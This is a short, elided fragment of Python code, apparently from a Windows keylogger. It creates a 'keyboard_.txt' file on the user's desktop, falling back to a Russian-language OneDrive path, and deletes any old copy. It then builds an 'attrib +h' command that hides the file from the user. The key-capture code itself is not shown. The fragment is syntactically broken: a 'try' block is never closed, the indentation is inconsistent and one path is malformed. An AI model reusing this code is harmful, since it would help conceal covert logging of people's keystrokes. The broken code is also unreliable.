...
try: file_name1 = codecs.open("C:\\Users\\"+ user_name +"\\Desktop\\keyboard_.txt", 'w', encoding='utf-8')
except: file_name1 = codecs.open("C:\\Users\\" + user_name + "\\OneDrive\\Рабочий стол\\keyboard_.txt", "w", encoding = "utf-8")
file_name1.close()
try:
    ...
    if os.path.exists("C:\\Users\\"+ user_name +"\\OneDrive\\Desktop\\keyboard_.txt"):
        os.unlink("C:\\Users\\"+ user_name +"\\OneDrive\\Desktop\\keyboard_.txt")
    skrit = "attrib +h C:\\Users\\"+user_name+"OneDrive\\Рабочий стол\\keyboard_.txt"
try: file_name = open("C:\\Users\\"+ user_name +"\\Desktop\\keyboard_.txt", 'w', encoding='utf-8')
except: file_name = codecs.open("C:\\Users\\" + user_name + "\\OneDrive\\Рабочий стол\\keyboard_.txt", "w", encoding = "utf-8")
